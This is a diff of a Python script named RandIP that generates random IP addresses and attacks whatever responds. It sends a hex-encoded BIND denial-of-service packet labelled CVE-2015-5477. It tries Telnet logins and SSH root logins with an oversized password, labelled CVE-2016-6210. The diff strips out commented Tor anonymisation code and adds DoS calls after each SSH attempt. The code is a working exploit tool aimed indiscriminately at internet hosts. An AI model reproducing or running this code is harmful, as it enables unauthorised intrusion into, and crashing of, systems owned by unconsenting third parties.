@@ -1,5 +1,5 @@
-#RandIP 0.9.2 beta#
-#Random IP Generator with Tor, Socket, SSH, Telnet, and HTML Screenshot support.#
+#RandIP 0.9.3 beta#
+#Random IP Generator with Socket, SSH, Telnet, and HTML Screenshot support.#
 #Report bugs including uncontained exceptions to blmvxer@gmail.com#
 import socket, os, time, telnetlib, paramiko, requests, zipfile, stem.process, subprocess, sys
 from random import randint
@@ -98,22 +98,7 @@ def WriteLog():
 	for hostr in hostlog:
 		os.remove(hostr)
 	os.remove(logfile)
-#	tor_process.kill()
 	print('Directory cleaned!, All sockets closed!, and Tor shutdown!')
-
-#def Tor_Connect():
-#	try:
-#		print(term.format('Connecting to Tor...', term.Color.BLUE))
-#		global tor_process
-#		tor_process = stem.process.launch_tor_with_config(
-#		config = {
-#		'SocksPort': str(SOCKS_PORT),
-#		'ExitNodes': '{ru}',
-#		},
-#		init_msg_handler = print_bootstrap_lines,
-#		)
-#	except OSError:
-#		subprocess.call("killall tor")
 
 def print_bootstrap_lines(line):
   if "Bootstrapped " in line:
@@ -142,6 +127,7 @@ fp = open(logfile, 'w')
 #Tor_Connect()
 
 def tBindDOS():
+	print('Using CVE:2015-5477')
 	print('Sending packet to ' + address + ' ...')
 	payload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex'))
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -165,18 +151,12 @@ for address in randip():
 			req = requests.get('http://' + address)
 			if str(req.status_code) == '200':
 				print(term.format('Response Code: ' + str(req.status_code) + ' Works', term.Color.GREEN))
-				tBindDOS()
-				#subprocess.call("./bind9 " + address, shell=True)
 			elif str(req.status_code) == '400':
 				print(term.format('Response Code: ' + str(req.status_code) + ' Bad Request', term.Color.RED))
 			elif str(req.status_code) == '401':
 				print(term.format('Response Code: ' + str(req.status_code) + ' Unauthorized', term.Color.YELLOW))
-				tBindDOS()
-				#subprocess.call("./bind9 " + address, shell=True)
 			elif str(req.status_code) == '403':
 				print(term.format('Response Code: ' + str(req.status_code) + ' Forbidden', term.Color.YELLOW))
-				tBindDOS()
-				#subprocess.call("./bind9 " + address, shell=True)
 			elif str(req.status_code) == '404':
 				print(term.format('Response Code: ' + str(req.status_code) + ' Not Found', term.Color.RED))
 			else:
@@ -200,31 +180,25 @@ for address in randip():
 				tn.write("exit\n")
 				print tn.read_all()
 				d.append(tn.read_all())
-#				tor_process.kill()
-#				Tor_Connect()
 			except socket.error:
 				print(socket.error, 'Error Signing in or Telnet not accessible', address)
 				print '\n'
 				e.append(address)
-#				tor_process.kill()
-#				Tor_Connect()
 				pass
 			except EOFError:
 				print(EOFError, address)
 				d.append(address)
-#				tor_process.kill()
-#				Tor_Connect()
 				pass
 			except KeyboardInterrupt:
 				WriteLog()
-				tor_process.kill()
 #				break
 			try:
 				print('Starting SSH Attempt on %s' % address)
+				print('Using CVE:2016-6210')
 				SSH = paramiko.SSHClient()
 				p = 'A'*25000
 				starttime=time.clock()
-				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+				SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 				try:
 					SSH.connect(address, username='root', password=p)
 					stdin, stdout, stderr = client.exec_command('ls')
@@ -232,38 +206,31 @@ for address in randip():
 						print '... ' + line.strip('\n')
 					client.close()
 					f.append(address)
+					tBindDOS()
 				except:
 					endtime=time.clock()
 					f.append(address)
 					total=endtime-starttime
 					print(total)
+					tBindDOS()
 			except socket.timeout:
 				print(socket.timeout, '%s timeout SSH or SSH not accessible' % address)
 				g.append(address)
-#				tor_process.kill()
-#				Tor_Connect()
 				pass
 			except socket.error:
 				print(socket.timeout, '%s timeout SSH or SSH not accessible' % address)
-#				tor_process.kill()
 				g.append(address)
-#				Tor_Connect()
 				pass
 			except paramiko.ssh_exception.SSHException:
 				print(paramiko.ssh_exception.SSHException, 'SSH Could not connect or SSH not accessible', address)
 				g.append(address)
-#				tor_process.kill()
-#				Tor_Connect()
 				pass
 			except paramiko.ssh_exception.AuthenticationException:
 				print(paramiko.ssh_exception.AuthenticationException, 'Error logging into SSH' ,  address)
 				g.append(address)
-#				tor_process.kill()
-#				Tor_Connect()
 				pass
 			except KeyboardInterrupt:
 				WriteLog()
-#				tor_process.kill()
 				break
 		except socket.timeout:
 			print(socket.timeout, '%s timeout' % address)
@@ -283,31 +250,21 @@ for address in randip():
 		except requests.exceptions.HTTPError:
 			print(requests.exceptions.HTTPError, address)
 			a.append(address)
-#			tor_process.kill()
-#			Tor_Connect()
 			pass
 		except requests.exceptions.ConnectionError:
 			print(requests.exceptions.ConnectionError, address)
 			a.append(address)
-#			tor_process.kill()
-#			Tor_Connect()
 			pass
 		except requests.packages.urllib3.exceptions.LocationValueError:
 			print(requests.packages.urllib3.exceptions.LocationValueError, address)
 			a.append(address)
-#			tor_process.kill()
-#			Tor_Connect()
 			pass
 		except requests.exceptions.ReadTimeout:
 			print(requests.exceptions.ReadTimeout, address)
 			a.append(address)
-#			tor_process.kill()
-#			Tor_Connect()
 		except TypeError:
 			print(TypeError, address)
 			a.append(address)
-#			tor_process.kill()
-#			Tor_Connect()
 			pass
 		except Exception as e:
 			UnknownError()
@@ -315,5 +272,4 @@ for address in randip():
 		UnknownError()
 	except KeyboardInterrupt:
 		WriteLog()
-#		tor_process.kill()
 		break
